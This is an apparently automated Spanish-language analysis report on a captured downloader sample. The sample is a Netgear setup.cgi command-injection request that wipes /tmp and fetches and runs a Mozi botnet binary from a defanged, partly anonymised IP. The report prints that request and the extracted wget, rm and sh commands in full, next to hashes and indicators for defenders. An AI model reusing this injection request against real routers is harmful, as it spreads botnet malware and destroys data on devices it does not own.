# 🧬 Payload Analysis

`f81058be63fe3353fecc449b23c77756fdb9d5e6e68bc3c3f16a52f04d7c14b1`

## 📌 Resumen

Texto ASCII de 178 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://180.244.187.XXX:57704/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://180.244.187.XXX:57704/Mozi.m -O /tmp/netg` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/f81058be63fe3353fecc449b23c77756fdb9d5e6e68bc3c3f16a52f04d7c14b1.md](../../../../../malware-like/oraculo/downloader/f81058be63fe3353fecc449b23c77756fdb9d5e6e68bc3c3f16a52f04d7c14b1.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:19:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f81058be63fe3353fecc449b23c77756fdb9d5e6e68bc3c3f16a52f04d7c14b1`
- **SHA1:** `772ffcdbabbb2fe5f310839d96fe2c9655e6f613`
- **MD5:** `3d43cf01073ccf7ac841b3b46ab56b4a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 178 B |
| Entropía | 5.2 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://180.244.187.XXX:57704/Mozi.m+-O+/tmp/netg
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://180.244.187.XXX:57704/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 180.244.187.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://180.244.187.XXX:57704/Mozi.m+-O+/tmp/netg | strings |
| hash | f81058be63fe3353fecc449b23c77756fdb9d5e6e68bc3c3f16a52f04d7c14b1 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
